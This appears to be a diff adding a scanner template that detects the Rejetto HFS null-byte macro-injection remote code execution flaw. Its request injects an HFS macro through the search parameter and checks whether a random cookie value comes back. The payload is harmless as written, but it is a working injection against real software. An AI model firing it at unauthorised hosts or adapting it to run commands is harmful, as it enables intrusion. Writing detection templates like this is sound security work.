@@ -1,0 +1,26 @@
+id: hfs-rce
+
+info:
+  name: HFS 远程命令执行漏洞
+  author: laohuan12138
+  severity: high
+  verified: true
+  description: |
+    HTTP File Server是一款专为个人用户所设计的HTTP文件服务器，它提供虚拟档案系统，支持新增、移除虚拟档案资料夹等。
+    Rejetto HTTP File Server 2.3c及之前版本中的parserLib.pas文件中的‘findMacroMarker’函数中存在安全漏洞，该漏洞源于parserLib.pas文件没有正确处理空字节。远程攻击者可借助搜索操作中的‘%00’序列利用该漏洞执行任意程序。 product="HFS"
+  reference:
+    - https://www.shuzhiduo.com/A/Ae5RqXBmJQ/
+
+set:
+    randomword: randomLowercase(8)
+    hostname: request.url.host
+rules:
+    r0:
+        request:
+          raw: |
+            GET /?search==%00{.cookie|out|value%3d{{randomword}}.}
+            Host: {{hostname}}
+            User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
+            Content-Type: application/x-www-form-urlencoded
+        expression: response.status == 200 && response.raw_header.bcontains(bytes(randomword))
+expression: r0()
